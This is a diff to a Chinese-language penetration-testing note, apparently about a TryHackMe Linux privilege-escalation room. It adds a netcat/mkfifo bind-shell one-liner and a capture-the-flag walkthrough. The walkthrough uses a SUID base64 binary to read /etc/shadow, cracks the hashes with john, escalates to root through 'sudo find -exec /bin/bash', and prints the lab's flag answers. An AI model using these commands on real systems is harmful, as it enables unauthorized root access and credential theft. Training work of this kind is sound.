@@ -2,6 +2,10 @@
 
 # Shell and Web Shell
 
+###### mkfifo /tmp/f; nc -lvnp {PORT} < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+###### nc的输出为/bin/bash的输入，/bin/bash的输出写入管道/tmp/f，/tmp/f为nc的输入.
+
 比较简单, 主要是netcat和matesploit的使用
 
 不用msfvenom生成shellcode payload也可以看在线网站：https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
@@ -142,3 +146,81 @@ Crontab 总是值得检查的，因为它有时会导致简单的权限升级向
 或者查找任意我们当前用户可写文件夹，并尝试将文件夹添加至环境变量
 
     export PATH=<path>:$PATH
+
+### NFS
+
+比较简单，但是应该会比较少见
+
+# linux提权 最终挑战
+
+到目前为止，您对 Linux 上的主要权限升级向量有了相当好的了解，这个挑战应该相当容易。
+
+您已经获得了对大型科学设施的SSH访问权限。尝试提升您的权限，直到您成为 Root。
+我们 设计此房间是为了帮助您构建全面的 Linux 方法论 权限提升在 OSCP 和 OSCP 等考试中非常有用 您的渗透测试活动。
+
+不让任何特权升级向量不被探索，特权升级通常更像是一门艺术而不是一门科学。
+
+您可以通过浏览器访问目标计算机或使用下面的 SSH 凭据。
+
+用户名： leonard
+
+密码：Penny123
+
+### flag1.txt文件的内容是什么？
+
+    uname -a
+    https://www.linuxkernelcves.com/
+    找内核相关漏洞，没找到
+
+sudo -l什么都没有
+
+尝试查找设置了suid的文件：
+
+<pre>[leonard@ip-10-10-241-187 ~]$ find / -type f -perm -04000 2&gt;/dev/null
+/usr/bin/base64
+/usr/bin/crontab
+.....
+</pre>
+
+读取/etc/passwd和/etc/shadow然后使用unshadow合并，使用john爆破：
+
+<pre><font color="#367BF0">──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
+<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">scp</font> leonard@10.10.241.187:/etc/passwd ./passwd
+(leonard@10.10.241.187) Password: 
+passwd                                        100% 2789     5.5KB/s   00:00</pre>
+
+<pre>[leonard@ip-10-10-241-187 ~]$ base64 /etc/shadow | base64 -d
+</pre>
+
+<pre><font color="#367BF0">──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
+<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">unshadow</font> <u style="text-decoration-style:single">./passwd</u> <u style="text-decoration-style:single">./shadow</u> <font color="#277FFF"><b>&gt;</b></font> p_s.txt
+Created directory: /root/.john
+                                                                                
+<font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
+<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">john</font> <font color="#9755B3">--wordlist=/usr/share/wordlists/rockyou.txt</font> <u style="text-decoration-style:single">./p_s.txt</u>
+</pre>
+
+结果:
+
+<pre><font color="#FEA44C">Password1</font>        (<font color="#FEA44C">missy</font>) </pre>
+
+登录ssh，查找flag1并尝试读取:
+
+<pre>[missy@ip-10-10-241-187 ~]$ find -name flag1.txt 2&gt;/dev/null
+./Documents/flag1.txt
+[missy@ip-10-10-241-187 ~]$ cat ./Documents/flag1.txt
+THM-42828719920544
+</pre>
+
+THM-42828719920544
+
+### flag2.txt文件的内容是什么？
+
+在missy账号上查看sudo -l ，发现可以使用find,可以尝试提权
+
+<pre>[missy@ip-10-10-241-187 ~]$ sudo find . -exec /bin/bash \;
+[root@ip-10-10-241-187 missy]# locate flag2.txt
+/home/rootflag/flag2.txt
+[root@ip-10-10-241-187 missy]# cat /home/rootflag/flag2.txt
+THM-168824782390238
+</pre>
